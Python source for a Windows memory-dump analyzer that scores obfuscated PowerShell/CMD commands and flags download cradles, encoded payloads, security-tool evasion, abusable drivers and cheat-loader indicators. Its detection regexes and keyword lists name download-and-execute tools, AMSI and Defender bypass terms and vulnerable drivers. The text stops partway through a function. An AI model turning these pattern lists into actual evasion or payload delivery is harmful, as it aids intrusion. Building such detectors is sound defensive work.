#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RamDumpAnalyzer++  (3-in-1)
===========================
Unified RAM dump / kernel dump / script analyzer for Windows.

Combines the workflows of:
  * MarsPixelDumpAnalyzer   - raw RAM dump scanner (cheat / loader / script artifacts)
  * PowerShellParser++      - PowerShell & CMD command-line reconstruction and parsing
  * KernelLiveDump++        - kernel live dump artifacts (drivers, mappers, services)

Plus new detection engines:
  * Obfuscated command detection for commands run from PowerShell OR cmd.exe,
    graded Basic -> Low -> Medium -> High -> Very High -> Extreme.
  * Download-cradle detection: files downloaded from a URL hidden in a script
    (plain, concatenated, defanged or encoded URLs), including download+execute chains.
  * Recursive de-obfuscation: -EncodedCommand / base64 / hex / gzip / percent-encoded
    payloads are decoded and re-scanned layer by layer.

Results are an investigative aid for authorized inspection only.
A detection alone is not definitive proof; review every hit in context.

Usage:
    RamDumpAnalyzer++.exe            (no args)      -> opens the GUI
    RamDumpAnalyzer++.exe <file>     (with args)    -> command-line scan
      options:
        -o, --json PATH      write JSON report
        --csv PATH           write CSV report
        --txt PATH           write plain-text report
        --min-severity sev   filter: info|low|medium|high|critical  (default: low)
        --max-findings N     stop after N findings (default 50000)
        --quiet              suppress console progress
        --selftest           build a synthetic test dump and verify detection engines
"""

import argparse
import base64
import binascii
import csv
import gzip
import json
import math
import os
import queue
import re
import sys
import threading
import time
import zlib
from dataclasses import dataclass, field
from datetime import datetime

APP_NAME = "Japan RAM Analyzer"
APP_VERSION = "1.3.2"
BANNER = r"""
==============================================================
   Japan RAM Analyzer  v{v}   (3-in-1)
   RAM dump | PowerShell/CMD | Kernel dump - unified scanner
==============================================================
""".format(v=APP_VERSION)

# ----------------------------------------------------------------------------
# Tuning constants
# ----------------------------------------------------------------------------
CHUNK_SIZE = 8 * 1024 * 1024        # 8 MiB streaming chunks
OVERLAP = 65536                     # overlap so strings at boundaries survive
MAX_STRING_ANALYZE = 4096           # analyze at most this many chars per string
MAX_FINDINGS_DEFAULT = 50000
MAX_EXCERPT = 220
MAX_LAYER = 4                       # decode recursion depth
MAX_DECODE_OPS = 20000              # global decode budget per scan
MAX_DISPLAY_ROWS = 4000             # rows loaded into the treeview at once

SEV_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
SEV_ORDER_INV = {v: k for k, v in SEV_ORDER.items()}
DEFAULT_WORKERS = max(1, min(8, os.cpu_count() or 1))

ENGINES = (
    "PS/CMD Obfuscation",
    "Download Cradle",
    "Encoded Payload",
    "Evasion Technique",
    "Kernel Artifact",
    "Cheat/Loader Indicator",
    "Injection API",
    "PE Image in Memory",
    "Compressed Blob",
)

# ----------------------------------------------------------------------------
# Findings
# ----------------------------------------------------------------------------
@dataclass
class Finding:
    engine: str
    severity: str          # info low medium high critical
    offset: int            # absolute file offset (parent offset for decoded layers)
    excerpt: str
    detail: str
    level_score: int = 0   # obfuscation score 0-100 when applicable
    level_name: str = ""   # obfuscation level name
    host: str = ""         # powershell | cmd | script | ""
    layer: int = 1
    seen: int = 1          # how many times this exact string was hit (merged rows)

    def sort_key(self):
        return (SEV_ORDER.get(self.severity, 0), self.level_score, self.offset)


def obf_level(score: int) -> str:
    """Map a 0-100 obfuscation score to a level name."""
    if score >= 90:
        return "Extreme"
    if score >= 70:
        return "Very High"
    if score >= 50:
        return "High"
    if score >= 35:
        return "Medium"
    if score >= 20:
        return "Low"
    if score >= 10:
        return "Basic"
    return "None"


def level_severity(score: int) -> str:
    if score >= 70:
        return "critical"
    if score >= 50:
        return "high"
    if score >= 35:
        return "medium"
    if score >= 10:
        return "low"
    return "info"


# ----------------------------------------------------------------------------
# Compiled detection patterns
# ----------------------------------------------------------------------------

# --- raw string extraction (bytes) ---
RE_ASCII_STR = re.compile(rb"[\x20-\x7e]{6,}")
RE_UTF16_STR = re.compile(rb"(?:[\x20-\x7e]\x00){6,}")

# --- process invocation / host detection ---
RE_PS_TOKEN = re.compile(r"(?i)\b(powershell(_ise)?|pwsh|pwrshell)\b")
RE_CMD_TOKEN = re.compile(r"(?i)\b(cmd|cmd\.exe|comspec|cmd32)\b")
RE_PS_FLAGS = re.compile(
    r"(?i)-{1,2}(?:enc(?:oded(?:command)?)?|e\b|c\b|command\b|w\b|windowstyle\b|"
    r"nop(?:rofile)?\b|noni\b|noninteractive\b|ep\b|executionpolicy\b|sta\b|"
    r"hidden|bypass|unrestricted)\b|/enc\b"
)
RE_CMD_FLAGS = re.compile(r"(?i)(?:^|\s)/[ckr]\b|@echo\s+off|\bcall\b.*&")

# --- encoded payload primitives ---
RE_ENC_B64_ARG = re.compile(
    r"""(?i)(?:-{1,2}enc(?:oded(?:command)?)?\b|/{1,2}enc\b|-(?:e)\b)
        [\s"':=]{0,4}(["A-Za-z0-9+/=\\_-]{24,})""",
    re.X,
)
RE_B64_BLOB = re.compile(
    r"(?<![A-Za-z0-9+/=\\_-])(?<!data:)(?<!base64,)(?<!base64;)"
    r"([A-Za-z0-9+/=\\_-]{48,})(?![A-Za-z0-9+/=\\_-])"
)
RE_HEX_SEP = re.compile(r"(?i)(?:0x)?[0-9a-f]{2}(?:[\s,]+(?:0x)?[0-9a-f]{2}){15,}")
RE_HEX_PLAIN = re.compile(r"(?<![0-9a-fA-F])[0-9a-f]{80,}(?![0-9a-fA-F])")
RE_PCT_ENC = re.compile(r"(?:%[0-9a-fA-F]{2}){8,}")

# --- download cradle ---
RE_URL = re.compile(
    r"""(?ix)
        \b(?:https?|hxxps?|hXXps?|ftp|ftps)://[^\s"'<>`\\)\]}]{4,}
      | \\{2}[A-Za-z0-9_.\-]{2,32}\\[^\s"'<>`]{3,80}          # UNC path
      | \baHR0(?:cDov|cHM6|cHM)[A-Za-z0-9+/=_-]{8,}            # base64("http...")
    """
)
RE_DOWNLOADER = re.compile(
    r"""(?ix)\b(?:
        webclient|net\.webclient|downloadstring|downloadfile|downloaddata|downloadtask|
        invoke-webrequest|iwr|invoke-restmethod|irm|
        bitsadmin|start-bitstransfer|
        certutil|urlcache|
        xmlhttp|serverxmlhttp|msxml2|msxml|
        adodb\.stream|savetofile|
        winhttp|wininet|internetopenurl|urldownloadtofile|
        system\.net\.http|httpclient|curl|wget
    )\b"""
)
RE_EXEC_AFTER = re.compile(
    r"""(?ix)\b(?:
        iex|icm|invoke-expression|invoke-command|
        start-process|invoke-item|start\(\)|
        \.run\b|shellexecute|rundll32|regsvr32|mshta|
        wscript|cscript|cmd\s*/[ck]|powershell|pwsh|
        &\s*\(|forfiles|squiblydoo
    )"""
)
RE_URL_EXT = re.compile(
    r"(?i)\.(exe|dll|ps1|psm1|psd1|bat|cmd|vbs|vbe|js|jse|wsf|wsh|hta|scr|jar|"
    r"zip|rar|7z|lnk|sct|xsl|iso|img|msi|msix|apk|sys)\b"
)
RE_DEFANGED_URL = re.compile(r"(?i)\bh[xX]{2}p?s?\b|\b68\.74\.74\.70\b|\b104\.116\.116\.112\b|`h?`t?`t?`p")
RE_DNS_TXT = re.compile(r"(?i)nslookup[^\n;|&]{0,80}-q(?:uerytype)?[= ]txt|resolve-dnsname[^\n;|&]{0,60}-?type\s+txt")

# --- evasion ---
RE_EVASION_ALL = re.compile(
    r"""(?ix)(?P<amsi>amsi(?:bypass|patch|initfail|scanbuffer|scanstring)|amsiutils)
      | (?P<etw>etwbypass|patch(?:ing|ed)?\W{0,10}etw|etw\W{0,10}patch|EtwEventWrite)
      | (?P<def>(?:add|set)-mppreference|disablerealtimemonitoring|
             (?:windows\s+)?defender\W{0,20}(?:bypass|disable|exclusion|off))
      | (?P<pol>set-executionpolicy\W{0,20}(?:bypass|unrestricted))
      | (?P<pers>schtasks\W{0,60}/create|currentversion\\run\b|reg add\W{0,40}\\run\b)
      | (?P<by>uac ?bypass|bypass ?uac|sleep ?ob|syscalls?|halos?\s?gate|tartarus|hells?\s?gate|indirect ?syscalls?)
    """
)
EV_DETAIL = {
    "amsi": ("high", "AMSI bypass / patching indicator"),
    "etw": ("high", "ETW patching indicator"),
    "def": ("high", "Windows Defender tampering (exclusion / realtime-off)"),
    "pol": ("medium", "execution policy set to bypass/unrestricted"),
    "pers": ("medium", "persistence mechanism (schtasks/run key)"),
    "by": ("medium", "bypass / syscall technique naming"),
}

# --- kernel artifacts ---
RE_VULN_DRIVER = re.compile(
    r"(?i)\b(iqvw64e?\.sys|rtcore64?\.sys|gdrv\.sys|dbk6?4?\.sys|msio64?\.sys|"
    r"ntio6?4?\.sys|winio(?:32|64)?\.(?:sys|dll)|phymem6?4?\.sys|physmem\.sys|"
    r"amifldrv6?4?\.sys|nvflash6?4?\.sys|inpoutx64\.dll|ndisrd\.sys|echo_driver|"
    r"sgk\_sys|faceit\.sys|aswvmm\.sys)\b"
)
RE_MAPPER = re.compile(r"(?i)\b(kdmapper|manual[-_ ]?map(?:per|ped)?|mapper\.exe|\.map\s+driver)\b")
RE_KERNEL_OBJ = re.compile(r"\\(?:Device|Driver|FileSystem)\\[A-Za-z0-9_.\-]{2,48}")
RE_SVC_REG = re.compile(r"(?i)\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet\d+\\Services\\[A-Za-z0-9_.\-]{2,48}")

# --- injection APIs (generic, low severity) ---
RE_INJECT_API_SRC = r"""\b(CreateRemoteThreadEx?|NtCreateThreadEx|RtlCreateUserThread|WriteProcessMemory|
    NtWriteVirtualMemory|NtMapViewOfSection|SetWindowsHookEx[AW]?|LdrLoadDll|
    VirtualAllocEx|QueueUserAPC|RtlQueueApcWow64Thread)\b"""
RE_INJECT_API = re.compile(RE_INJECT_API_SRC)

# --- cheat / loader indicators ---
RE_CHEAT_BRAND_SRC = r"""\b(?:
        keyauth(?:\.win|\.cc)?|auth\.gg|luarmor|keysystem\.gg|shieldgate|
        skeet\.cc|gamesense(?:\.pub)?|neverlose\.cc|onetap\.(?:solutions|click|com)|
        fatality\.win|interwebz\.cc|mutiny\.cc|ev0\.(?:aio|college|gg)|
        primordial\.gg|extera\.network|exploit\.gg|legend\.cheat|nucleus\.gg|
        nns\.ph|haites|osiris\.cheat|vape\s?v4|lmaobox|load\.stone|
        cheat\.gg|loader\.gg|slash\.gg|vac\.bypass|hwid\s?(?:check|lock|bind)|
        \bhwid\b|cheatloader|silentloader|beta\.loader
    )\b"""
RE_CHEAT_BRAND = re.compile("(?xi)" + RE_CHEAT_BRAND_SRC)

# combined always-on matcher: one regex call per recovered string
RE_ANY_INDICATOR = re.compile(
    "(?imx)(?P<brand>" + RE_CHEAT_BRAND_SRC + r")|(?P<api>" + RE_INJECT_API_SRC + ")"
)

# --- PE / compression binary markers ---
RE_DOS_STUB = re.compile(rb"This program cannot be run in DOS mode")
RE_GZIP_MAGIC = re.compile(rb"\x1f\x8b\x08")

# --- cheap keyword prefilter deciding which strings get deep analysis ---
# Candidate triggers: tokens that mark a byte region worth full analysis.
# Used at C speed over raw chunks (ASCII) and de-interleaved UTF-16 views.
CANDIDATE_TOKENS = (
    # process invocation / encoding flags
    "powershell", "pwsh", "cmd.exe", "comspec", "-enc", "encodedcommand",
    "invoke-expression", "invoke-command", "iex", "icm", "new-object",
    # downloaders / cradles
    "webclient", "downloadstring", "downloadfile", "downloaddata",
    "invoke-webrequest", "invoke-restmethod", "start-bitstransfer",
    "bitsadmin", "certutil", "urlcache", "urldownloadtofile",
    "xmlhttp", "serverxmlhttp", "adodb.stream", "savetofile",
    "winhttp", "wininet", "internetopenurl", "httpclient",
    "curl", "wget", "user-agent", "pastebin",
    # execution / persistence / evasion
    "mshta", "regsvr32", "schtasks", "rundll32", "wscript", "cscript",
    "forfiles", "frombase64string", "amsiutils", "amsiinitfail",
    "amsibypass", "etwbypass", "add-mppreference", "set-mppreference",
    "set-executionpolicy", "disablerealtimemonitoring", "executionpolicy",
    "shellcode", "deflatestream", "gzipstream",
    # kernel artifacts
    "kdmapper", "manual-map", "manualmap", "manual map", "mapper",
    "iqvw64e", "rtcore64", "gdrv.sys", "winio", "phymem", "msio64",
    "ntio64", "dbk64", "\\device\\", "\\driver\\", "\\filesystem\\",
    "\\registry\\machine", ".sys",
    # cheat / loader ecosystem
    "keyauth", "auth.gg", "luarmor", "keysystem", "shieldgate", "skeet",
    "gamesense", "neverlose", "onetap", "fatality.win", "interwebz",
    "mutiny", "ev0.", "primordial", "extera", "hwid", "cheat", "loader",
    "cheatloader",
    # URLs / schemes
    "http://", "https://", "hxxp", "ftp://",
    # injection APIs
    "createremotethread", "ntcreatethreadex", "rtlcreateuserthread",
    "writeprocessmemory", "ntwritevirtualmemory", "ntmapviewofsection",
    "setwindowshookex", "ldrloaddll", "virtualallocex", "queueuserapc",
)
RE_CANDIDATE_TOKENS_LOWER_BYTES = [t.encode("ascii").lower() for t in CANDIDATE_TOKENS]
RE_CANDIDATE_TOKENS_LOWER_STR = [t.lower() for t in CANDIDATE_TOKENS]
MAX_WINDOWS_PER_CHUNK = 25000        # fair-sample cap on analyzed windows per chunk
WINDOW_CONTEXT_BACK = 1200           # bytes of context before a candidate anchor
WINDOW_CONTEXT_FWD = 2600            # bytes of context after a candidate anchor
MAX_FP_KEYS = 400000                 # dedupe table cap (bounds memory)


def _find_anchors(lowered, tokens, soft_cap):
    """Find all token positions in a lowercased buffer/view via C-speed find()."""
    anchors = []
    append = anchors.append
    for tok in tokens:
        start = 0
        find = lowered.find
        tok_len = len(tok)
        while True:
            idx = find(tok, start)
            if idx == -1:
                break
            append(idx)
            start = idx + tok_len
    return anchors


# ----------------------------------------------------------------------------
# Small helpers
# ----------------------------------------------------------------------------
def shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    freq = {}
    for ch in text:
        freq[ch] = freq.get(ch, 0) + 1
    n = len(text)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


def printable_ratio(data: bytes) -> float:
    if not data:
        return 0.0
    good = sum(1 for b in data if 32 <= b <= 126 or b in (9, 10, 13))
    return good / len(data)


def b64_decode_flexible(s: str):
    """Best-effort base64 decode (handles padding / whitespace / backslashes)."""
    s = re.sub(r"[\\\s]", "", s)
    if len(s) < 24:
        return None
    if not re.fullmatch(r"[A-Za-z0-9+/=_-]+", s):
        return None
    pad = "=" * (-len(s) % 4)
    for variant in (s, s.replace("-", "+").replace("_", "/")):
        try:
            raw = base64.b64decode(variant + pad, validate=False)
            if raw:
                return raw
        except (binascii.Error, ValueError):
            continue
    return None


def bytes_to_text(raw: bytes) -> str:
    """Pick the more printable interpretation (utf-16le vs utf-8/ascii)."""
    if not raw:
        return ""
    if raw[:2] in (b"\xff\xfe", b"\xfe\xff"):
        try:
            return raw.decode("utf-16", errors="replace")
        except Exception:
            pass
    best = ""
    for enc in ("utf-16-le", "utf-8", "latin-1"):
        data = raw[: len(raw) - 1] if (enc == "utf-16-le" and len(raw) % 2) else raw
        try:
            cand = data.decode(enc, errors="strict")
        except (UnicodeDecodeError, ValueError):
            cand = data.decode(enc, errors="replace")
        if printable_ratio(cand.encode("utf-8", errors="replace")) > 0.85:
            return cand
        if printable_ratio(cand.encode("utf-8", errors="replace")) > printable_ratio(best.encode("utf-8", errors="replace")):
            best = cand
    return best


def truncate(text: str, n: int = MAX_EXCERPT) -> str:
    text = text.replace("\r", " ").replace("\n", " ")
    return text if len(text) <= n else text[: n - 3] + "..."


# ----------------------------------------------------------------------------
# Obfuscation scoring engine
# ----------------------------------------------------------------------------
def score_obfuscation(text: str, host: str):
    """Return (score 0-100, [signal names], n_hard_signals).

    HARD signals are constructs that only occur in genuinely obfuscated
    PS/CMD commands (encoded flags, char-code builders, cmd expansion...).
    SOFT signals (entropy, symbol density, backticks in prose, .split( in
    JavaScript...) only carry weight when a hard signal is present - without
    one the score is capped at "Basic" so ordinary text can never grade as
    highly obfuscated."""
    score = 0
    signals = []
    hard = 0
    low = text.lower()
    length = len(text)

    def add(points, name, is_hard=False):
        nonlocal score, hard
        score += points
        signals.append(name)
        if is_hard:
            hard += 1

    # 1. Encoded command flag (HARD)
    if re.search(r"(?i)-{1,2}enc(?:oded(?:command)?)?\b|/enc\b|-\s?e\b\s+[A-Za-z0-9+/=]{24,}", text):
        add(30, "encoded-command flag", True)

    # 1b. Stealth invocation flags (HARD): -w hidden / -nop / -noni / -ep bypass
    if re.search(r"(?i)(?:^|\s)-{1,2}(?:w\s+hidden|windowstyle\s+hidden|nop(?:rofile)?\b|"
                 r"noni\b|noninteractive\b|sta\b|ep\s+bypass|executionpolicy\s+bypass)", text):
        add(12, "stealth invocation flags", True)

    # 2. Base64 blob (HARD - data:/base64, URIs excluded: inline web assets)
    if RE_B64_BLOB.search(text):
        add(20, "base64 blob", True)

    # 3. Hex blob (HARD)
    if RE_HEX_SEP.search(text) or RE_HEX_PLAIN.search(text):
        add(15, "hex blob", True)

    # 4. String concatenation chains (soft: also common in JS)
    concat_hits = len(re.findall(r"""["'][^"'\n]{0,24}["']\s*\+|["']\s*\+\s*["']""", text))
    if concat_hits >= 3:
        add(min(18, 6 + concat_hits * 2), "concatenation chains")

    # 5. Format-string construction (soft)
    fmt = re.search(r"(?i)-f\b[^|\n]{0,60}$|-f\s+\S", text)
    braces = re.findall(r"\{(\d+)\}", text)
    if fmt and braces:
        pts = 20 if sorted(set(braces)) != list(range(len(set(braces)))) or len(braces) >= 4 else 14
        add(pts, "format-string (-f) construction")

    # 6. Char code arrays (HARD)
    if re.search(r"(?i)\[char\]\s*[\(\[]|\(char\)\s*\d|char\[\]|\[convert\]::frombase64", text):
        add(16, "char-code construction", True)
    mnum = re.search(r"(?:\d{1,3}\s*,\s*){15,}\d{1,3}", text)
    if mnum:
        nearby = text[max(0, mnum.start() - 120):mnum.end() + 60]
        if re.search(r"(?i)\[char\]|char\[\]|-join|-split", nearby):
            add(22, "numeric byte array", True)      # byte array feeding a decoder
        else:
            add(6, "numeric data array")             # plain numeric data (JS etc.)

    # 7. Split / join (soft: '.split(' is everywhere in JS)
    if re.search(r"(?i)-join\b|-split\b|\[string\]::join|::join\(", text):
        add(10, "split/join manipulation")
    elif re.search(r"(?i)\.split\(", text):
        add(4, ".split() calls")

    # 8. Reverse tricks (HARD: bare reverse() excluded - common in JS)
    if re.search(r"(?i)\[-1\.\.|\[-\d+\.\.-\d+\]|\.\.\s*-1\b|\[array\]::reverse", text):
        add(12, "string reversal", True)

    # 9. Replace-based building (soft: .replace( is common in JS)
    replace_hits = len(re.findall(r"(?i)-replace\b|\.replace\s*\(", text))
    if replace_hits >= 2:
        add(min(10, 4 + replace_hits), "replace-chain building")

    # 10. Encoding / crypto / decompression primitives
    enc_hits = 0
    for pat in (r"(?i)frombase64string", r"(?i)\[convert\]::", r"(?i)text\.encoding",
                r"(?i)\.getstring\(", r"(?i)deflatestream|gzipstream", r"(?i)\bxor\b"):
        if re.search(pat, text):
            enc_hits += 1
    if enc_hits:
        add(min(16, enc_hits * 8), "encoding/crypto primitives")

    # 11. Invoke-expression / indirection (soft: '&&(' matches C/JS, dropped)
    if re.search(r"(?i)\biex\b|\bicm\b|invoke-expression|invoke-command|start-job|start-threadjob", text):
        add(10, "invoke-expression / indirection")

    # 12. Backtick escaping: intra-word ticks are PS-only (HARD);
    #     bare tick runs also fit markdown code spans (soft)
    intra_ticks = len(re.findall(r"\w`\w", text))
    if intra_ticks >= 3:
        add(16, "backtick intra-word escaping", True)
    else:
        ticks = text.count("`")
        if ticks >= 8:
            add(10, "backtick escaping")
        elif ticks >= 3:
            add(5, "backtick escaping")

    # 13. Alias soup
    if re.search(r"(?i)(?:^|[\s;|(])((?:gv|sal|sv|sls|foreach-object|icm|ni) ?\s*){2,}", text):
        add(8, "alias soup")

    # 14. Case mangling of known keywords
    mangled = 0
    for kw in ("invoke-expression", "downloadstring", "new-object", "webclient",
               "powershell", "bypass", "downloadfile", "frombase64string"):
        if kw in low and kw not in text:
            mangled += 1
    if mangled:
        add(min(12, 4 * mangled), "randomized casing")

    # 15. Special-character density
    if length >= 30:
        special = sum(text.count(c) for c in "{}()[]<>|^~`$@#%;+*/\\?!")
        density = special / length
        if density > 0.30:
            add(16, "high symbol density")
        elif density > 0.15:
            add(8, "elevated symbol density")

    # 16. CMD host specifics
    if host in ("cmd", "powershell+cmd"):
        carets = text.count("^")
        if carets >= 2:
            add(min(20, 8 + carets * 4), "cmd caret escaping", True)
        if re.search(r"%[a-z_][a-z0-9_]*:~\d", low):
            add(20, "cmd substring expansion", True)
        if re.search(r"![a-z_][a-z0-9_]*!", low):
            add(10, "delayed expansion", True)
        if re.search(r"(?i)\bset\s+/a\b", text) or re.search(r"%[a-z0-9_]+%%[a-z0-9_]+%", low):
            add(12, "cmd variable math/concat", True)
        if re.search(r"(?i)\bfor\s+/f\b", text):
            add(8, "cmd for /f parsing")

    # 19. Percent-encoded command content (HARD): %68%74%74%70... style hiding
    if re.search(r"(?:%[0-9a-fA-F]{2}){8,}", text):
        add(22, "percent-encoded content", True)

    # 17. Entropy
    if length >= 80:
        ent = shannon_entropy(text)
        if ent >= 5.8:
            add(26, "very high entropy")
        elif ent >= 5.0:
            add(18, "high entropy")
        elif ent >= 4.2:
            add(8, "elevated entropy")

    # 18. Invoke-Obfuscation fingerprints (HARD; need 2 hits or 1 + exec alias
    #     so a single coincidental match can't fire it)
    fp_hits = len(re.findall(r"(?i)\$\{\w+\}\s*-?f|\(\s*\$\w+:\s*\[|\{[0-9]\}\{[0-9]\}\{[0-9]\}", text))
    if fp_hits >= 2 or (fp_hits and re.search(r"(?i)\biex\b|invoke-", text)):
        add(25, "invoke-obfuscation fingerprint", True)

    # no hard technique => ordinary text: cap at "Basic"
    if not hard:
        score = min(score, 19)
    score = min(100, score)
    return score, signals, hard


# ----------------------------------------------------------------------------
# Scanner core
# ----------------------------------------------------------------------------
class ScanContext:
    def __init__(self, max_findings=MAX_FINDINGS_DEFAULT, min_severity="low"):
        self.findings = []
        self.dedupe = {}
        self.decode_ops = 0
        self.max_findings = max_findings
        self.min_sev = SEV_ORDER.get(min_severity, 1)
        self.truncated = False

    def add(self, engine, severity, offset, excerpt, detail, level_score=0, level_name="", host="", layer=1,
            dedupe_key=None):
        if SEV_ORDER.get(severity, 1) < self.min_sev:
            return False
        # one row per unique (engine, artifact): repeats merge into a seen-count
        key = (engine, dedupe_key) if dedupe_key else (engine, truncate(excerpt, 120))
        existing = self.dedupe.get(key)
        if existing is not None:
            existing.seen += 1
            return False
        if len(self.findings) >= self.max_findings:
            self.truncated = True
            return False
        fnd = Finding(engine, severity, offset, truncate(excerpt), detail,
                      level_score, level_name, host, layer)
        self.dedupe[key] = fnd
        self.findings.append(fnd)
        return True

    def decode_budget(self, n=1):
        if self.decode_ops + n > MAX_DECODE_OPS:
            return False
        self.decode_ops += n
        return True


def detect_host(text: str) -> str:
    has_ps = bool(RE_PS_TOKEN.search(text))
    has_cmd = bool(RE_CMD_TOKEN.search(text)) or bool(re.search(r"(?i)(?:^|[\s&|])/[ckr]\b", text))
    if has_ps and not has_cmd:
        return "powershell"
    if has_cmd and not has_ps:
        return "cmd"
    if has_ps and has_cmd:
        return "powershell+cmd"
    return "script"


# ---- full analysis of one candidate window --------------------------------
# Obfuscation is graded on the actual COMMAND SLICE, not the whole window:
# a 4 KiB browser/JSON window that merely MENTIONS a command must not
# inherit its score. Transport context (chat logs, JSON transcripts,
# markdown code spans) quoting a command caps the finding at low severity.
RE_PS_CMD_HEAD = re.compile(
    r"""(?imx)
        (?:^|[\s&|;^(\"'`])(?:[a-z]:[\\/][^\s"';|&]*[\\/])?
          (?P<head>(?:powershell(?:\.exe)?|pwsh(?:\.exe)?|powershell_ise|cmd(?:\.exe)?))
          \s+ (?:-{1,3}[A-Za-z] | /(?:c|k|r|v|d|s|q)\b)
    """
)
RE_PS_ALIAS = re.compile(r"(?i)\biex\b|\bicm\b|invoke-expression|invoke-command")
RE_PS_CONSTRUCT = re.compile(
    r"(?i)\[char\]\s*[\(\[]|char\[\]|\[convert\]::frombase64|frombase64string\b|\w`\w"
)
# JSON/chat transport markers inside a slice: literal \n \r \t \" escapes,
# JSON scaffolding, markdown code fences/spans
RE_TRANSPORT_MARKS = re.compile(r'\\[nrt"]|":"|","|"?:?"')
RE_MD_CODE_SPAN = re.compile(r"`[^`\n]{2,60}`")


def _is_transport(before: str, slice_text: str):
    """True when the command lives inside quoted/transport content rather
    than raw execution context (console, script body, process command line)."""
    b = before.rstrip()
    if b.endswith(('/c', '/k', '/r')) or b.endswith(('&', '|', ';', '(', '>', '^')):
        return False                       # real invocation chaining
    if b.endswith(('"', "'", ":", ",", "}", "]", "`")):
        return True                        # JSON scaffolding / quotes right before
    if len(RE_TRANSPORT_MARKS.findall(slice_text[:400])) >= 4:
        return True                        # escaped-newline JSON transcript content
    if "```" in slice_text or len(RE_MD_CODE_SPAN.findall(slice_text)) >= 2:
        return True                        # markdown code spans
    return False


def _command_slices(work: str):
    """Carve command slices (head/alias/construct -> end of line) for scoring.
    Slices start AT the command token so identical commands quoted repeatedly
    produce identical excerpts and merge in the dedupe table."""
    slices = []      # (start, text)
    spans = []       # accepted spans, to skip nested alias/construct slices

    def _fits(s, e):
        return any(s0 <= s and e <= e0 for s0, e0 in spans)

    for m in RE_PS_CMD_HEAD.finditer(work):
        s = m.start("head")
        end = work.find("\n", s)
        if end == -1 or end - s > 1600:
            end = min(len(work), s + 1600)
        slices.append((s, work[s:end]))
        spans.append((s, end))
        if len(slices) >= 4:
            return slices
    for m in RE_PS_ALIAS.finditer(work):
        s = m.start()
        end = work.find("\n", s)
        if end == -1 or end - s > 800:
            end = min(len(work), s + 800)
        if _fits(s, end):
            continue
        slices.append((s, work[s:end]))
        spans.append((s, end))
        if len(slices) >= 4:
            return slices
    for m in RE_PS_CONSTRUCT.finditer(work):
        s = m.start()
        end = work.find("\n", s)
        if end == -1 or end - s > 800:
            end = min(len(work), s + 800)
        if _fits(s, end):
            continue
        slices.append((s, work[s:end]))
        spans.append((s, end))
        if len(slices) >= 4:
            return slices
    return slices


def analyze_window(content: str, offset: int, ctx: ScanContext, layer: int, encoding: str):
    work = content[:MAX_STRING_ANALYZE]
    host = detect_host(work)
    if not host:
        host = "script"
    transport = _window_transport(work)

    # ---- always-on indicators (brand / injection API) ----
    # excerpt = the matched artifact so shifted windows merge into one row
    m = RE_ANY_INDICATOR.search(work)
    if m:
        art = truncate(m.group(0), 120)
        if m.lastgroup == "brand":
            ctx.add("Cheat/Loader Indicator", "low", offset, art,
                    f"brand/indicator: {m.group(0)}", layer=layer)
        else:
            ctx.add("Injection API", "low", offset, art, f"API: {m.group(0)}", layer=layer)

    # ---- obfuscated command findings (graded per command slice) ----
    for s_start, slice_text in _command_slices(work):
        before = work[max(0, s_start - 160):s_start]
        s_transport = transport or _is_transport(before, slice_text)
        score, signals, _hard = score_obfuscation(slice_text, host)
        if s_transport:
            # command quoted in a transcript/chat/JSON: real text, not execution
            score = min(score, 34)
            signals = signals + ["quoted-in-transcript (JSON/chat/markdown)"]
        if score >= 10:
            level = obf_level(score)
            sev = level_severity(score)
            detail = "signals: " + ", ".join(signals[:10])
            if s_transport:
                detail += " [transport context - severity capped]"
            if encoding == "utf16":
                detail += " (UTF-16 resident string)"
            ctx.add("PS/CMD Obfuscation", sev, offset, slice_text, detail,
                    level_score=score, level_name=level, host=host, layer=layer)

    # ---- download cradle ----
    cradle_scan(work, offset, ctx, layer, host, transport=transport)

    # ---- evasion ----
    evasion_scan(work, offset, ctx, layer, host, transport=transport)

    # ---- kernel artifacts ----
    kernel_scan(work, offset, ctx)

    # ---- encoded payloads: decode and recurse ----
    decode_and_recurse(work, offset, ctx, layer, host)


def _window_transport(work: str):
    """True when the window is transport content: a JSON transcript, chat log,
    markdown source quote, etc. Commands/URLs inside such content are quoted
    text, not execution evidence."""
    head = work[:1200]
    if len(RE_TRANSPORT_MARKS.findall(head)) >= 6:
        return True
    if "```" in head or len(RE_MD_CODE_SPAN.findall(head)) >= 2:
        return True
    return False


def cradle_scan(work: str, offset: int, ctx: ScanContext, layer: int, host: str, transport: bool = False):
    def _c(sev):
        if not transport or sev in ("low", "info"):
            return sev
        return "low"

    def _add(sev, ukey, detail):
        if transport and SEV_ORDER.get(sev, 0) > SEV_ORDER["low"]:
            detail += " [transport context - severity capped]"
        ctx.add("Download Cradle", _c(sev), offset, work, detail,
                layer=layer, host=host, dedupe_key="url:" + ukey)

    urls = [m.group(0) for m in RE_URL.finditer(work)][:6]
    if not urls:
        # encoded / defanged URL without scheme
        if RE_DEFANGED_URL.search(work) and RE_DOWNLOADER.search(work):
            _add("medium", "defanged", "defanged or obfuscated URL with downloader API")
        return

    downloader = RE_DOWNLOADER.search(work)
    exec_after = RE_EXEC_AFTER.search(work)
    for u in urls:
        ext = RE_URL_EXT.search(u)
        ext_txt = f" target file: {ext.group(0)}" if ext else ""
        if downloader and exec_after:
            _add("critical", u.lower()[:120],
                 f"URL downloaded via {downloader.group(0)} AND executed "
                 f"({exec_after.group(0)}{ext_txt})")
        elif downloader:
            _add("high" if ext else "medium", u.lower()[:120],
                 f"URL referenced with downloader API {downloader.group(0)}{ext_txt}")
        elif ext:
            # URL to an executable/script but no visible downloader keyword
            _add("low", u.lower()[:120],
                 f"URL pointing to executable/script payload{ext_txt}")

    if RE_DNS_TXT.search(work) and ("http" in work.lower() or downloader):
        dm = RE_DNS_TXT.search(work)
        _add("high", "dns-txt:" + dm.group(0).lower()[:60],
             "script appears to fetch payload via DNS TXT record")

    dm = RE_DEFANGED_URL.search(work)
    if dm and downloader:
        _add("medium", "defanged:" + dm.group(0).lower()[:60],
             "defanged/encoded URL scheme near downloader")


def evasion_scan(work: str, offset: int, ctx: ScanContext, layer: int, host: str, transport: bool = False):
    m = RE_EVASION_ALL.search(work)
    if m:
        sev, why = EV_DETAIL[m.lastgroup]
